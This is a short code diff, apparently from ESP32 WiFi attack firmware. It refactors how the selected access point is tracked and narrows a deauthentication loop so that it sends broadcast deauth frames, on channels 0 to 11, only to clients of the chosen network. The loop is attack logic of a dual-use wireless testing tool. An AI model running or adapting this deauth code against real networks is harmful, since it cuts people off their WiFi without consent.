@@ -287,13 +287,13 @@ void WiFiModule::Scan(ScanType type)
       delete stations;
       stations = new LinkedList<Station>();
 
-      if (G_Utils::getSelectedAccessPoint(access_points).channel == 0)
+      if (SelectedAP.channel == 0)
       {
         Serial.println("Cant Set Channel to 0. Maybe You Forgot to select a ap");
         return;
       }
 
-      uint8_t set_channel = G_Utils::getSelectedAccessPoint(access_points).channel;
+      uint8_t set_channel = SelectedAP.channel;
 
       esp_wifi_init(&cfg);
       esp_wifi_set_storage(WIFI_STORAGE_RAM);
@@ -345,7 +345,7 @@ void WiFiModule::listAccessPoints()
                             + (String)access_points->get(i).rssi + " "
                             + access_points->get(i).Manufacturer;
 
-            if (access_points->get(i).selected) {
+            if (access_points->get(i).essid == SelectedAP.essid) {
                 output += " (selected)";
             }
 
@@ -360,7 +360,7 @@ void WiFiModule::listSSIDs()
         for (int i = 0; i < ssids->size(); i++) {
             String output = "[" + (String)i + "] " + ssids->get(i).essid;
 
-            if (ssids->get(i).selected) {
+            if (ssids->get(i).essid == SelectedAP.essid) {
                 output += " (selected)";
             }
 
@@ -749,13 +749,16 @@ SystemManager::getInstance().SetLEDState(ENeoColor::Red, false);
         }
         for(int i = 0; i < access_points->size(); i++){
         AccessPoint ap = access_points->get(i);
-        for (int x = 0; x < ap.stations->size(); x++) {
-            Station cur_sta = stations->get(ap.stations->get(x));
-              for (int y = 0; y < 12; y++) {
-                uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
-                sendDeauthFrame(ap.bssid, y, broadcast_mac);
+        if (ap.essid == SelectedAP.essid)
+        {
+            for (int x = 0; x < ap.stations->size(); x++) {
+              Station cur_sta = stations->get(ap.stations->get(x));
+                for (int y = 0; y < 12; y++) {
+                  uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};      
+                  sendDeauthFrame(ap.bssid, y, broadcast_mac);
+                }
               }
-            }
+          }
         }
       }
 SystemManager::getInstance().SetLEDState(ENeoColor::Red, true);
